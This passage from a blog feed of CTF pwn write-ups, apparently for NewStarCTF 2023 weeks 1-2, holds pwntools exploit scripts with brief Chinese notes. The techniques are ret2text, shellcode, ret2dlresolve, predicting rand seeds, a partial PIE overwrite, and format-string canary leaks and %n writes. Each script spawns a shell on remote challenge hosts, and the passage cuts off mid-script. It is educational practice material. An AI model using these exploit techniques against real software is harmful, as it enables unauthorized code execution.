punctuation\">(</span>flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>binsh<span class=\"token punctuation\">,</span> plt_init<span class=\"token punctuation\">,</span> reloc_index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>chain<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>fakeRel <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>r_offset<span class=\"token punctuation\">,</span> r_info<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>fakeSym <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>elfStr <span class=\"token operator\">-</span> strtab<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>fakeSym <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span>elfStr <span class=\"token operator\">-</span> strtab<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">0x12</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>fakebs <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\0'</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>fakestr <span class=\"token operator\">=</span> <span class=\"token string\">b'system\\0'</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span>fakeRel<span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">:</span>fakeSym<span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">:</span>fakebs<span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">:</span>fakestr<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./1697288799970-7107d330-bc2f-4e0e-afb2-4634faa0a7e8.png\" alt=\"image.png\"></p>\n",
            "tags": [
                "format string",
                "srop",
                "orw",
                "dlresolve"
            ]
        },
        {
            "id": "http://waltcsz.github.io/2023/10/newstarctf2023-week1-2/",
            "url": "http://waltcsz.github.io/2023/10/newstarctf2023-week1-2/",
            "title": "newstarctf2023_week1-2",
            "date_published": "2023-10-11T17:11:10.000Z",
            "content_html": "<h1 id=\"week1\"><a class=\"markdownIt-Anchor\" href=\"#week1\">#</a> week1</h1>\n<h2 id=\"ret2text\"><a class=\"markdownIt-Anchor\" href=\"#ret2text\">#</a> ret2text</h2>\n<p>ret2text</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./ret2text')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27637</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b ')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x020</span><span class=\"token operator\">+</span><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x04011FB</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"newstar_shop\"><a class=\"markdownIt-Anchor\" href=\"#newstar_shop\">#</a> newstar_shop</h2>\n<p>整数溢出</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#p=process('./newstar_shop')</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25094</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">inp</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>inp<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>inp<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>inp<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>inp<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>inp<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>inp<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>inp<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>inp<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>inp<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ezshellcode\"><a class=\"markdownIt-Anchor\" href=\"#ezshellcode\">#</a> ezshellcode</h2>\n<p>shellcode x64</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#p=process('./ezshellcode')</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25686</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sh<span class=\"token operator\">=</span>asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"random\"><a class=\"markdownIt-Anchor\" href=\"#random\">#</a> *Random</h2>\n<p>random ctypes<br>\n 使用 ctypes 可以在 python 中使用 c 语言库函数。<br>\nc 语言的随机是伪随机，使用 srand 决定随机种子。而题目中使用 <code>time(0)</code>  获取当前时间作为随机种子。我们可以进行同样操作，以此生成完全一致的随机数。<br>\n<img data-src=\"./1696841331129-5aa3cc63-bca6-417d-b8c4-1f848942b50c.png\" alt=\"image.png\"><br>\nv8 为第 1 个随机数。在输入与 v8 同样的数字后可进入 if 语句中。<br>\nv3 在取第 2 个随机数模 5 作为下标后，从字符串中获取字符。<br>\nv4 则是取第 3 个随机数模 2 作为下标取字符。<br>\n之后 sy 函数中 v4，v3 分别作为 1，2 个字符组成字符串作为 system 的参数。<br>\n原字符串中可以提出 <code>'$'</code>  和 <code>'0'</code>  组成 <code>&quot;$0&quot;</code> 。因此需要第 2 个随机数模 5 为 2，第 3 个随机数模 2 为 1。循环执行脚本，直到第 2、3 个随机数符合要求。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./pwn')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29429</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">#gdb.attach(p, 'b ')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    e<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">5</span><span class=\"token operator\">!=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">2</span><span class=\"token operator\">!=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'number?\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"p1eee\"><a class=\"markdownIt-Anchor\" href=\"#p1eee\">#</a> p1eee</h2>\n<p>pie<br>\n 程序保护启动了 pie，但没开启 canary。<br>\n栈溢出覆盖返回地址低位即可。<br>\n要修改的地址和原本地址很近，即后门函数为 0x1264，原返回地址为 0x1297，所以只需修改一个字节即可（其实也只够修改一个字节）。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x020</span><span class=\"token operator\">+</span><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x6c</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#p=process('./pwn')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28268</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b read')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"week2\"><a class=\"markdownIt-Anchor\" href=\"#week2\">#</a> week2</h1>\n<h2 id=\"canary\"><a class=\"markdownIt-Anchor\" href=\"#canary\">#</a> canary</h2>\n<p>format string, canary<br>\n 用 printf 漏洞泄露 canary，然后组成 payload。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./canary')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27529</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b ')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x030</span><span class=\"token operator\">-</span><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x401262</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%11$p\\n'</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'gift?\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'gift:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload <span class=\"token operator\">=</span> offset<span class=\"token operator\">*</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'magic'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"secret_number-x2\"><a class=\"markdownIt-Anchor\" href=\"#secret_number-x2\">#</a> secret_number x2</h2>\n<p>format string<br>\n 猜数字，利用 printf 将储存的 secret 变量修改为设定值，然后输入设定值完成 if 条件判断。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./secretnumber')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29618</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b printf')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x404C</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset </pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#p.send(b'%16$p\\n')</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#add1 = p.recvuntil</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#add2 = add1 - 0xc0</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%17$p\\n'</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'it\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'gift:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>main_a <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>target <span class=\"token operator\">+=</span> main_a <span class=\"token operator\">-</span> <span class=\"token number\">0x12f5</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+] the secret address is '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#p.send(b'%16$p\\n')</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#add1 = p.recvuntil</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#add2 = add1 - 0xc0</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'aa%9$n'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'it\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td 